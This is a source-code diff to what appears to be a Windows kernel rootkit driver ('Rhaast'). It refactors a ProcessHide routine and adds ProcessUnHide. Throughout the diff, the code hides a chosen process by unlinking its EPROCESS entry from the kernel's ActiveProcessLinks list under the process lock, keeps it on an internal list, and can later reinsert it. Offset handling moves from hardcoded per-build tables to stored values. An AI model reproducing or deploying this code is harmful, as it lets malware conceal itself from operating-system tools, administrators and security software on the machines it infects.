@@ -1,26 +1,29 @@
 #include <Rhaast.h>
 
-/*!
- * Hides specified process id 
+/**
+ * @brief
+ *      Hides specified process id
+ *
+ * @param Pid
+ *      Pid of process to hide
+ *
+ * @return 
+ *      function status 
  */
 NTSTATUS ProcessHide(
-    ULONG Pid
+    IN ULONG Pid
 ) {
-    PEPROCESS     EProcess       = NULL;
-    NTSTATUS      NtStatus       = STATUS_UNSUCCESSFUL;
-    PLIST_ENTRY   ProcessActList = NULL;
-    PVOID         ProcessLock    = NULL;
-    ULONG         ProcessListOfs = 0;
-    ULONG         ProcessLockOfs = 0;
+    PEPROCESS   EProcess       = NULL;
+    NTSTATUS    NtStatus       = STATUS_UNSUCCESSFUL;
+    PLIST_ENTRY ProcessActList = NULL;
+    PVOID       ProcessLock    = NULL;
 
-    /* resolve offsets */
-    if ( ( ! ( ProcessLockOfs = ProcessLockOffset() ) ) || 
-         ( ! ( ProcessListOfs = ProcessActiveListOffset() ) ) ) 
-    {
-        PUTS( "Failed to get offsets ");
+    /* if found just tell it was successful and return */
+    if ( PsListHiddenCheck( Pid ) ) {
+        NtStatus = STATUS_SUCCESS;
         goto CLEANUP;
     }
-
+    
     /* get Process EPROCESS object by Pid */
     if ( ! NT_SUCCESS( NtStatus = PsLookupProcessByProcessId( C_PTR( Pid ), &EProcess) ) ) {
         PRINTF( "PsLookupProcessByProcessId Failed: %p\n", NtStatus )
@@ -28,13 +31,13 @@ NTSTATUS ProcessHide(
     }
 
     /* get pointer of EPROCESS.ActiveProcessLinks linked list */
-    if ( ! ( ProcessActList = C_PTR( U_PTR( EProcess ) + ProcessListOfs ) ) ) { 
+    if ( ! ( ProcessActList = C_PTR( U_PTR( EProcess ) + Instance.Ofs.ProcessActiveList ) ) ) { 
         NtStatus = STATUS_UNSUCCESSFUL;
         goto CLEANUP;
 	}
 
     /* get pointer of EPROCESS.ProcessLock lock */
-    if ( ! ( ProcessLock = C_PTR( U_PTR( EProcess ) + ProcessLockOfs ) ) ) {
+    if ( ! ( ProcessLock = C_PTR( U_PTR( EProcess ) + Instance.Ofs.ProcessLock ) ) ) {
         NtStatus = STATUS_UNSUCCESSFUL;
         goto CLEANUP; 
     }
@@ -67,75 +70,71 @@ CLEANUP:
 
 /**
  * @brief
- *	get process lock offset based on current windows version
+ *      unhide process by re-inserting the hidden process
+ *      EPROCESS into the EPROCESS.ActiveProcessLinks
+ *      of the System Process (0x4)
+ *
+ * @param Pid
+ *      process to unhide
+ *
+ * @return
+ *      status of function
  */
-ULONG ProcessLockOffset(
-    VOID
+NTSTATUS ProcessUnHide(
+    IN ULONG Pid
 ) {
-    ULONG Offset = 0;
+    PEPROCESS   EProcess       = NULL;
+    NTSTATUS    NtStatus       = STATUS_UNSUCCESSFUL;
+    PLIST_ENTRY ProcessActList = NULL;
+    PLIST_ENTRY ProcessEntry   = NULL;
+    PVOID       ProcessLock    = NULL;
 
-    switch ( Instance.WindowsBuild )
-    {
-        case WINBUILD_1507:
-        case WINBUILD_1511:
-        case WINBUILD_1607:
-        case WINBUILD_1703:
-        case WINBUILD_1709:
-        case WINBUILD_1803:
-        case WINBUILD_1809: {
-            Offset = 0x2d8;
-            break;
-        }
-
-        case WINBUILD_1903:
-        case WINBUILD_1909: {
-            Offset = 0x2e0;
-            break;
-        }
-
-        default: {
-            Offset = 0x438;
-            break;
-        }
+    /* if not found just tell it was unsuccessful and return */
+    if ( ! PsListHiddenCheck( Pid ) ) {
+        goto CLEANUP;
+    }
+        
+    /* get Process EPROCESS object by Pid */
+    if ( ! NT_SUCCESS( NtStatus = PsLookupProcessByProcessId( C_PTR( SYSTEM_PROCESS_PID ), &EProcess ) ) ) {
+        PRINTF( "PsLookupProcessByProcessId Failed: %p\n", NtStatus )
+        goto CLEANUP;
     }
 
-    /* return offset lock */
-    return Offset;
-}
-
-/*
- * get process lock offset based on current windows version
- */
-ULONG ProcessActiveListOffset(
-    VOID
-) {
-    ULONG Offset = 0;
-
-    switch ( Instance.WindowsBuild )
-    {	
-        case WINBUILD_1507:
-        case WINBUILD_1511:
-        case WINBUILD_1607:
-        case WINBUILD_1903:
-        case WINBUILD_1909: {
-            Offset = 0x2f0;
-            break;
-        }
-
-        case WINBUILD_1703:
-        case WINBUILD_1709:
-        case WINBUILD_1803:
-        case WINBUILD_1809: {
-            Offset = 0x2e8;
-            break;
-        }
-		
-        default: {
-            Offset = 0x448;
-            break;
-        }	
+    /* get pointer of EPROCESS.ActiveProcessLinks linked list */
+    if ( ! ( ProcessActList = C_PTR( U_PTR( EProcess ) + Instance.Ofs.ProcessActiveList ) ) ) {
+        NtStatus = STATUS_UNSUCCESSFUL;
+        goto CLEANUP;
     }
 
-    /* return offset lock */
-    return Offset;
+    /* get pointer of EPROCESS.ProcessLock lock */
+    if ( ! ( ProcessLock = C_PTR( U_PTR( EProcess ) + Instance.Ofs.ProcessLock ) ) ) {
+        NtStatus = STATUS_UNSUCCESSFUL;
+        goto CLEANUP;
+    }
+
+    /* acquire ActiveProcessLinks lock */
+    ExAcquirePushLockExclusive( ProcessLock );
+
+    /* backup & add EPROCESS.ActiveProcessLinks entry to
+     * our internal linked list to un-hide it later */
+    if ( ! NT_SUCCESS( NtStatus = PsListHiddenRemove( Pid, &ProcessEntry ) ) ) {
+        PUTS( "Failed to remove process from PsHidden list" )
+        goto CLEANUP;
+    }
+
+    /* insert our hidden process back into the ActiveProcessLinks
+     * from the System Process */
+    DoubleLinkedAdd( ProcessActList, ProcessEntry  );
+
+CLEANUP:
+    if ( ProcessLock ) {
+        /* release lock */
+        ExReleasePushLockExclusive( ProcessLock );
+    }
+
+    if ( EProcess ) {
+        ObfDereferenceObject( EProcess );
+    }
+
+    return NtStatus;
 }
